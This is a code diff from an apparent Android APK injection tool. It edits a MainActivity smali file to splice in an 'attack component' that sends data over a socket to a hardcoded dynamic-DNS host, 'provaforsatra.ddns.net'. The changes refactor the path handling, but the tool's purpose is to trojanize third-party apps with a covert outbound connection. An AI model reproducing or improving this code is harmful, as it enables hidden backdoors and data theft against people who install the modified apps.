@@ -234,13 +234,11 @@ def mainActivity_modifier(file, injection_type, client_payload):
 
 
 def mainActivity_socket_client(file, injection_type):
-    activityMainPath, fer = get_main_activity(file)
-    print('path:', fer)
-    app_name = activityMainPath.split("/")[-1].strip(".smali")
-    app_package = activityMainPath.replace(app_name + ".smali", "")
+    activityMainPath, activityMain = get_main_activity(file)
+    print('path:', activityMain)
 
-    # TODO ADD DNS ADDRESS
-    # ipv4 = os.popen('ifconfig en0').read().split("inet ")[1].split(" ")[0]
+    # ActivityMain without smali Extension
+    activity_main_path = activityMainPath.replace(activityMain, '').replace('.smali', '')
 
     # Attack component
     attack_parts = query(injection_type)
@@ -248,13 +246,13 @@ def mainActivity_socket_client(file, injection_type):
     invoke = attack_parts[0][1]
     send = attack_parts[0][2]
 
-    send = re.sub(MAIN_ACTIVITY_PATH, 'L' + fer.replace(".", "/"), send)
-    send = re.sub(MAIN_ACTIVITY_NAME, app_name, send)
+    send = re.sub(MAIN_ACTIVITY_PATH, 'L' + activityMain.replace(".", "/"), send)
+    send = re.sub(MAIN_ACTIVITY_NAME, activityMain, send)
     send = re.sub('192.168.1.15', 'provaforsatra.ddns.net', send)
 
     print(send)
 
-    send_file = open(os.path.join(app_package, app_name + "$send.smali"), "w+")
+    send_file = open(os.path.join(activity_main_path+"$send.smali"), "w+")
     send_file.write(send)
     send_file.close()
 
@@ -268,7 +266,7 @@ def mainActivity_socket_client(file, injection_type):
     onCreate_final = mainActivity.index(ON_CREATE_RETURN, onCreate_init)
     onCreate = mainActivity[onCreate_init:onCreate_final:]
 
-    invoke = re.sub(MAIN_ACTIVITY_PATH, PATH_SUFFIX + fer.replace(".", "/"), invoke)
+    invoke = re.sub(MAIN_ACTIVITY_PATH, PATH_SUFFIX + activityMain.replace(".", "/"), invoke)
     smali = before_onCreate + onCreate + invoke + "\n" + mainActivity[onCreate_final:len(mainActivity)] + "\n"
     # print(smali)
 
